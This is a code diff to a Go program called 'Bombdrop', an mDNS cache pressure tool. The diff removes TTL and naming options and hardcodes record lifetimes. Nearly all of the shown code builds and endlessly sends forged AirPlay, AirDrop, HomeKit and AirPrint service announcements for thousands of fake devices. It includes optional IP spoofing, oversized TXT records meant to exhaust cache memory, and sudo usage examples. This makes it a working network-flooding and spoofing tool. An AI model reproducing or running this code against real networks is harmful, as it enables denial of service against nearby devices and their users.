@@ -168,11 +168,6 @@ var (
 	printerCapabilities = []string{
 		"duplex", "color", "copies", "collate", "staple", "bind", "punch", "cover", "sort", "booklet",
 	}
-
-	// Default TTL for all mDNS records (2 hours)
-	DefaultTTL uint32 = 7200
-	// Extra long TTL option (24 hours)
-	ExtraLongTTL uint32 = 86400
 )
 
 // BroadcastType represents the type of broadcast to send
@@ -187,7 +182,7 @@ const (
 )
 
 // Update broadcastAnnouncements to use gopacket
-func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, nameMode string, roundNum int, debug bool) {
+func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, debug bool) {
 	startTime := time.Now()
 	announcementCount := 0
 	destAddr := &net.UDPAddr{IP: net.ParseIP("224.0.0.251"), Port: 5353}
@@ -225,8 +220,8 @@ func broadcastAnnouncements(conn *net.UDPConn, announcements []*dns.Msg, nameMod
 	}
 
 	if debug {
-		log.Printf("Broadcast completed: Mode: %s, Round: %d, Sent %d announcements in %v",
-			nameMode, roundNum, announcementCount, time.Since(startTime))
+		log.Printf("Broadcast completed: sent %d announcements in %v",
+			announcementCount, time.Since(startTime))
 	}
 }
 
@@ -238,12 +233,10 @@ func main() {
 	targetIP := flag.String("b", "224.0.0.251", "Target IP address to send to")
 	count := flag.Int("c", 0, "Number of announcement rounds (0 = infinite)")
 	broadcastTypeStr := flag.String("type", "all", "Broadcast type: airplay, airdrop, homekit, airprint, or all")
+	regenerate := flag.Bool("regenerate", false, "Generate new device names for each broadcast round")
 	preGenerate := flag.Bool("pregenerate", false, "Pre-generate devices once and reuse them")
 	cacheMode := flag.String("cache", "standard", "Cache pressure mode: standard, aggressive, extreme")
 	spoof := flag.Bool("spoof", false, "Enable IP address spoofing (requires root)")
-	ttlValue := flag.Uint("ttl", uint(DefaultTTL), "TTL value in seconds (default: 7200)")
-	ttlMode := flag.String("ttl-mode", "normal", "TTL mode: normal, long, extreme")
-	nameMode := flag.String("name-mode", "mixed", "Device naming mode: static, dynamic, compare")
 	flag.Parse()
 
 	// Show help if requested or no arguments provided
@@ -252,33 +245,29 @@ func main() {
 Bombdrop - mDNS Cache Pressure Tool
 
 Usage:
-  sudo go run bombdrop.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-c 10] [-type all]
+  sudo go run main.go -n 5000 [-debug] [-i eth0] [-b 224.0.0.251] [-c 10] [-type all]
 
 Options:
-  -n <num>         Number of devices to advertise (default: 1000)
-  -debug           Enable debug logging
-  -i <iface>       Network interface to use (default: system chosen)
-  -b <ip>          Target IP address (default: 224.0.0.251)
-  -c <count>       Number of announcement rounds (0 = infinite)
-  -type <t>        Broadcast type: airplay, airdrop, homekit, airprint, or all (default: all)
-  -spoof           Enable IP address spoofing (requires root/admin privileges)
-  -ttl <seconds>   TTL value in seconds (default: 7200)
-  -ttl-mode <mode> TTL mode: normal, long, extreme (default: normal)
-  -name-mode <m>   Device naming mode: static, dynamic, compare (default: mixed)
-  -pregenerate     Pre-generate
+  -n <num>    Number of devices to advertise (default: 1000)
+  -debug      Enable debug logging
+  -i <iface>  Network interface to use (default: system chosen)
+  -b <ip>     Target IP address (default: 224.0.0.251)
+  -c <count>  Number of announcement rounds (0 = infinite)
+  -type <t>   Broadcast type: airplay, airdrop, homekit, airprint, or all (default: all)
+  -h          Show this help message
 
 Examples:
   # Basic usage with 5000 devices
-  sudo go run bombdrop.go -n 5000
+  sudo go run main.go -n 5000
 
   # Specify network interface and only broadcast AirPlay
-  sudo go run bombdrop.go -i eth0 -n 1000 -type airplay
+  sudo go run main.go -i eth0 -n 1000 -type airplay
 
   # Use broadcast instead of multicast and only broadcast HomeKit
-  sudo go run bombdrop.go -b 192.168.1.255 -n 1000 -type homekit
+  sudo go run main.go -b 192.168.1.255 -n 1000 -type homekit
 
   # Send 10 rounds of AirPrint announcements and exit
-  sudo go run bombdrop.go -n 100 -c 10 -type airprint
+  sudo go run main.go -n 100 -c 10 -type airprint
 
 Notes:
   - For multicast: 224.0.0.251 is the standard mDNS address
@@ -367,29 +356,13 @@ Notes:
 
 	// Initialize the announcements variable
 	var currentAnnouncements []*dns.Msg
-	var staticAnnouncements []*dns.Msg
 
-	// Process the ttl mode flag
-	var actualTTL uint32
-	switch *ttlMode {
-	case "long":
-		actualTTL = ExtraLongTTL
-	case "extreme":
-		actualTTL = 604800 // 1 week
-	default:
-		actualTTL = uint32(*ttlValue)
-	}
-
-	if *debug {
-		log.Printf("Using TTL of %d seconds for mDNS records", actualTTL)
-	}
-
-	// Pre-generate static devices if needed
-	if *nameMode == "static" || *nameMode == "compare" || *preGenerate {
+	// Pre-generate devices if requested
+	if *preGenerate {
 		if *debug {
-			log.Printf("Pre-generating static device set with %d devices", *numDevices)
+			log.Printf("Using pre-generation mode for %d devices", *numDevices)
 		}
-		staticAnnouncements = generateDevices(*numDevices, broadcastTypes, actualTTL, *debug)
+		currentAnnouncements = preGenerateDevices(*numDevices, broadcastTypes, *debug)
 	}
 
 	// Track how many rounds we've sent
@@ -408,17 +381,12 @@ Notes:
 
 	// Main broadcast loop
 	for {
-		// Choose which announcements to use based on mode
-		if *nameMode == "dynamic" || (*nameMode == "compare" && roundsSent%2 == 1) {
+		// Generate devices only if not using pre-generation mode
+		if !*preGenerate && (*regenerate || roundsSent == 0) {
 			if *debug {
-				log.Printf("Using dynamic device names for this round")
+				log.Printf("Generating %d devices with fresh names", *numDevices)
 			}
-			currentAnnouncements = generateDevices(*numDevices, broadcastTypes, actualTTL, *debug)
-		} else {
-			if *debug && *nameMode == "compare" {
-				log.Printf("Using static device names for this round")
-			}
-			currentAnnouncements = staticAnnouncements
+			currentAnnouncements = generateDevices(*numDevices, broadcastTypes, *debug)
 		}
 
 		// Broadcast all announcements
@@ -478,7 +446,7 @@ Notes:
 			currentAnnouncements = sendInRandomBursts(conn, currentAnnouncements, *debug)
 		default:
 			// Standard steady broadcasts
-			broadcastAnnouncements(conn, currentAnnouncements, *nameMode, roundsSent, *debug)
+			broadcastAnnouncements(conn, currentAnnouncements, *debug)
 		}
 
 		// If cacheFlush is enabled, create special cache-flush records
@@ -487,14 +455,14 @@ Notes:
 
 			// Optionally, actually use the multiplier in device generation
 			if *preGenerate {
-				currentAnnouncements = generateDevicesForCachePressure(*numDevices, broadcastTypes, deviceMultiplier, actualTTL, *debug)
+				currentAnnouncements = generateDevicesForCachePressure(*numDevices, broadcastTypes, deviceMultiplier, *debug)
 			}
 		}
 	}
 }
 
 // Helper function to generate devices for the selected broadcast types
-func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
+func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, debug bool) []*dns.Msg {
 	var announcements []*dns.Msg
 
 	// Create a map for faster lookup
@@ -515,28 +483,28 @@ func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, ttl uint
 
 		// Add AirPlay announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirPlay] {
-			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID, ttl)
+			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airplayAnnouncements...)
 			broadcastInfo += "AirPlay "
 		}
 
 		// Add AirDrop announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirDrop] {
-			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID, ttl)
+			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airdropAnnouncements...)
 			broadcastInfo += "AirDrop "
 		}
 
 		// Add HomeKit announcements if requested
 		if includeAll || typeMap[BroadcastTypeHomeKit] {
-			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID, ttl)
+			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, homekitAnnouncements...)
 			broadcastInfo += "HomeKit "
 		}
 
 		// Add AirPrint announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirPrint] {
-			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID, ttl)
+			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airprintAnnouncements...)
 			broadcastInfo += "AirPrint "
 		}
@@ -550,7 +518,7 @@ func generateDevicesForTypes(count int, broadcastTypes []BroadcastType, ttl uint
 }
 
 // Modified generateDevices function to enhance cache pressure
-func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, multiplier int, ttl uint32, debug bool) []*dns.Msg {
+func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, multiplier int, debug bool) []*dns.Msg {
 	var announcements []*dns.Msg
 
 	for i := 0; i < count; i++ {
@@ -560,7 +528,7 @@ func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, 
 		deviceID := generateDeviceID()
 
 		// Generate standard announcements
-		deviceAnnouncements := generateDeviceAnnouncements(dnsName, deviceID, broadcastTypes, ttl)
+		deviceAnnouncements := generateDeviceAnnouncements(dnsName, deviceID, broadcastTypes)
 		announcements = append(announcements, deviceAnnouncements...)
 
 		// Add extra records to increase cache pressure
@@ -569,7 +537,7 @@ func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, 
 				// Generate variant records with slight differences
 				extraName := fmt.Sprintf("%s-extra%d", dnsName, j+1)
 				// Add TXT records with increasing sizes to consume more memory
-				extraTXT := createExtraSizedTXTRecord(extraName, j*1024, ttl) // Increasing record sizes
+				extraTXT := createExtraSizedTXTRecord(extraName, j*1024) // Increasing record sizes
 				announcements = append(announcements, extraTXT)
 			}
 		}
@@ -584,7 +552,7 @@ func generateDevicesForCachePressure(count int, broadcastTypes []BroadcastType, 
 }
 
 // Generate TXT records with specified size to consume more cache memory
-func createExtraSizedTXTRecord(name string, size int, ttl uint32) *dns.Msg {
+func createExtraSizedTXTRecord(name string, size int) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.Response = true
 	msg.Authoritative = true
@@ -595,7 +563,7 @@ func createExtraSizedTXTRecord(name string, size int, ttl uint32) *dns.Msg {
 			Name:   fmt.Sprintf("%s._large-txt._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: []string{
 			generateRandomString(size),
@@ -794,7 +762,7 @@ func sanitizeDeviceName(name string) (string, string) {
 	return dnsName, displayName
 }
 
-func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
+func createAirPlayAnnouncements(name string, deviceID string) []*dns.Msg {
 	// Create base AirPlay announcement
 	airplayMsg := new(dns.Msg)
 	airplayMsg.Response = true
@@ -807,7 +775,7 @@ func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   "_airplay._tcp.local.",
 			Rrtype: dns.TypePTR,
 			Class:  dns.ClassINET,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Ptr: fmt.Sprintf("%s._airplay._tcp.local.", name),
 	}
@@ -818,7 +786,7 @@ func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
 			Rrtype: dns.TypeSRV,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Priority: 0,
 		Weight:   0,
@@ -832,7 +800,7 @@ func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._airplay._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: []string{
 			"features=0x5A7FFFF7",
@@ -849,7 +817,7 @@ func createAirPlayAnnouncements(name string, deviceID string, ttl uint32) []*dns
 	return []*dns.Msg{airplayMsg}
 }
 
-func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
+func createAirDropAnnouncements(name string, deviceID string) []*dns.Msg {
 	// Create base AirDrop announcement
 	airdropMsg := new(dns.Msg)
 	airdropMsg.Response = true
@@ -862,7 +830,7 @@ func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   "_airdrop._tcp.local.",
 			Rrtype: dns.TypePTR,
 			Class:  dns.ClassINET,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Ptr: fmt.Sprintf("%s._airdrop._tcp.local.", name),
 	}
@@ -877,7 +845,7 @@ func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._airdrop._tcp.local.", name),
 			Rrtype: dns.TypeSRV,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Priority: 0,
 		Weight:   0,
@@ -891,7 +859,7 @@ func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._airdrop._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: []string{
 			fmt.Sprintf("deviceid=%s", deviceID),
@@ -910,7 +878,7 @@ func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s.local.", name),
 			Rrtype: dns.TypeA,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		A: generateRandomIP(),
 	}
@@ -919,7 +887,7 @@ func createAirDropAnnouncements(name string, deviceID string, ttl uint32) []*dns
 	return []*dns.Msg{airdropMsg}
 }
 
-func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
+func createHomeKitAnnouncements(name string, deviceID string) []*dns.Msg {
 	// Create base HomeKit announcement
 	homekitMsg := new(dns.Msg)
 	homekitMsg.Response = true
@@ -932,7 +900,7 @@ func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   "_hap._tcp.local.",
 			Rrtype: dns.TypePTR,
 			Class:  dns.ClassINET,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Ptr: fmt.Sprintf("%s._hap._tcp.local.", name),
 	}
@@ -943,7 +911,7 @@ func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._hap._tcp.local.", name),
 			Rrtype: dns.TypeSRV,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Priority: 0,
 		Weight:   0,
@@ -969,7 +937,7 @@ func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s._hap._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: []string{
 			fmt.Sprintf("md=%s", name),
@@ -990,7 +958,7 @@ func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns
 			Name:   fmt.Sprintf("%s.local.", name),
 			Rrtype: dns.TypeA,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		A: generateRandomIP(),
 	}
@@ -999,7 +967,7 @@ func createHomeKitAnnouncements(name string, deviceID string, ttl uint32) []*dns
 	return []*dns.Msg{homekitMsg}
 }
 
-func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dns.Msg {
+func createAirPrintAnnouncements(name string, deviceID string) []*dns.Msg {
 	// Create base AirPrint announcement
 	airprintMsg := new(dns.Msg)
 	airprintMsg.Response = true
@@ -1012,7 +980,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   "_ipp._tcp.local.",
 			Rrtype: dns.TypePTR,
 			Class:  dns.ClassINET,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Ptr: fmt.Sprintf("%s._ipp._tcp.local.", name),
 	}
@@ -1023,7 +991,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   "_ipps._tcp.local.",
 			Rrtype: dns.TypePTR,
 			Class:  dns.ClassINET,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Ptr: fmt.Sprintf("%s._ipps._tcp.local.", name),
 	}
@@ -1034,7 +1002,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   fmt.Sprintf("%s._ipp._tcp.local.", name),
 			Rrtype: dns.TypeSRV,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Priority: 0,
 		Weight:   0,
@@ -1048,7 +1016,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   fmt.Sprintf("%s._ipps._tcp.local.", name),
 			Rrtype: dns.TypeSRV,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Priority: 0,
 		Weight:   0,
@@ -1081,7 +1049,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   fmt.Sprintf("%s._ipp._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: []string{
 			"txtvers=1",
@@ -1126,7 +1094,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   fmt.Sprintf("%s._ipps._tcp.local.", name),
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		Txt: airprintTxt.Txt, // Reuse the same TXT records
 	}
@@ -1137,7 +1105,7 @@ func createAirPrintAnnouncements(name string, deviceID string, ttl uint32) []*dn
 			Name:   fmt.Sprintf("%s.local.", name),
 			Rrtype: dns.TypeA,
 			Class:  dns.ClassINET | 0x8000,
-			Ttl:    ttl,
+			Ttl:    4500,
 		},
 		A: generateRandomIP(),
 	}
@@ -1273,7 +1241,7 @@ func sendQueries(conn *net.UDPConn, mdnsAddr *net.UDPAddr, queries []*dns.Msg, r
 	}
 }
 
-func generateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
+func generateDevices(count int, broadcastTypes []BroadcastType, debug bool) []*dns.Msg {
 	var announcements []*dns.Msg
 
 	// Create a map for faster lookup
@@ -1294,28 +1262,28 @@ func generateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, debu
 
 		// Add AirPlay announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirPlay] {
-			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID, ttl)
+			airplayAnnouncements := createAirPlayAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airplayAnnouncements...)
 			broadcastInfo += "AirPlay "
 		}
 
 		// Add AirDrop announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirDrop] {
-			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID, ttl)
+			airdropAnnouncements := createAirDropAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airdropAnnouncements...)
 			broadcastInfo += "AirDrop "
 		}
 
 		// Add HomeKit announcements if requested
 		if includeAll || typeMap[BroadcastTypeHomeKit] {
-			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID, ttl)
+			homekitAnnouncements := createHomeKitAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, homekitAnnouncements...)
 			broadcastInfo += "HomeKit "
 		}
 
 		// Add AirPrint announcements if requested
 		if includeAll || typeMap[BroadcastTypeAirPrint] {
-			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID, ttl)
+			airprintAnnouncements := createAirPrintAnnouncements(dnsName, deviceID)
 			announcements = append(announcements, airprintAnnouncements...)
 			broadcastInfo += "AirPrint "
 		}
@@ -1342,13 +1310,13 @@ func setMulticastInterface(conn *net.UDPConn, ifi *net.Interface) error {
 }
 
 // Adding a new function to pre-generate and cache a large number of device announcements
-func preGenerateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
+func preGenerateDevices(count int, broadcastTypes []BroadcastType, debug bool) []*dns.Msg {
 	if debug {
 		log.Printf("Pre-generating %d devices (this may take a while)...", count)
 	}
 
 	startTime := time.Now()
-	announcements := generateDevices(count, broadcastTypes, ttl, debug)
+	announcements := generateDevices(count, broadcastTypes, false)
 
 	if debug {
 		log.Printf("Pre-generated %d devices with %d announcements in %v",
@@ -1359,7 +1327,7 @@ func preGenerateDevices(count int, broadcastTypes []BroadcastType, ttl uint32, d
 }
 
 // Add new function to efficiently pre-generate massive number of devices
-func efficientPreGeneration(count int, broadcastTypes []BroadcastType, ttl uint32, debug bool) []*dns.Msg {
+func efficientPreGeneration(count int, broadcastTypes []BroadcastType, debug bool) []*dns.Msg {
 	if debug {
 		log.Printf("Efficiently pre-generating %d devices...", count)
 	}
@@ -1384,16 +1352,16 @@ func efficientPreGeneration(count int, broadcastTypes []BroadcastType, ttl uint3
 					switch bType {
 					case BroadcastTypeAirPlay, BroadcastTypeAll:
 						deviceAnnouncements = append(deviceAnnouncements,
-							createAirPlayAnnouncements(dnsName, deviceID, ttl)...)
+							createAirPlayAnnouncements(dnsName, deviceID)...)
 					case BroadcastTypeAirDrop:
 						deviceAnnouncements = append(deviceAnnouncements,
-							createAirDropAnnouncements(dnsName, deviceID, ttl)...)
+							createAirDropAnnouncements(dnsName, deviceID)...)
 					case BroadcastTypeHomeKit:
 						deviceAnnouncements = append(deviceAnnouncements,
-							createHomeKitAnnouncements(dnsName, deviceID, ttl)...)
+							createHomeKitAnnouncements(dnsName, deviceID)...)
 					case BroadcastTypeAirPrint:
 						deviceAnnouncements = append(deviceAnnouncements,
-							createAirPrintAnnouncements(dnsName, deviceID, ttl)...)
+							createAirPrintAnnouncements(dnsName, deviceID)...)
 					}
 				}
 
@@ -1424,7 +1392,7 @@ func efficientPreGeneration(count int, broadcastTypes []BroadcastType, ttl uint3
 }
 
 // Add this function to your code
-func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []BroadcastType, ttl uint32) []*dns.Msg {
+func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []BroadcastType) []*dns.Msg {
 	var announcements []*dns.Msg
 
 	// Create a map for faster lookup
@@ -1438,25 +1406,25 @@ func generateDeviceAnnouncements(name string, deviceID string, broadcastTypes []
 
 	// Add AirPlay announcements if requested
 	if includeAll || typeMap[BroadcastTypeAirPlay] {
-		airplayAnnouncements := createAirPlayAnnouncements(name, deviceID, ttl)
+		airplayAnnouncements := createAirPlayAnnouncements(name, deviceID)
 		announcements = append(announcements, airplayAnnouncements...)
 	}
 
 	// Add AirDrop announcements if requested
 	if includeAll || typeMap[BroadcastTypeAirDrop] {
-		airdropAnnouncements := createAirDropAnnouncements(name, deviceID, ttl)
+		airdropAnnouncements := createAirDropAnnouncements(name, deviceID)
 		announcements = append(announcements, airdropAnnouncements...)
 	}
 
 	// Add HomeKit announcements if requested
 	if includeAll || typeMap[BroadcastTypeHomeKit] {
-		homekitAnnouncements := createHomeKitAnnouncements(name, deviceID, ttl)
+		homekitAnnouncements := createHomeKitAnnouncements(name, deviceID)
 		announcements = append(announcements, homekitAnnouncements...)
 	}
 
 	// Add AirPrint announcements if requested
 	if includeAll || typeMap[BroadcastTypeAirPrint] {
-		airprintAnnouncements := createAirPrintAnnouncements(name, deviceID, ttl)
+		airprintAnnouncements := createAirPrintAnnouncements(name, deviceID)
 		announcements = append(announcements, airprintAnnouncements...)
 	}
 
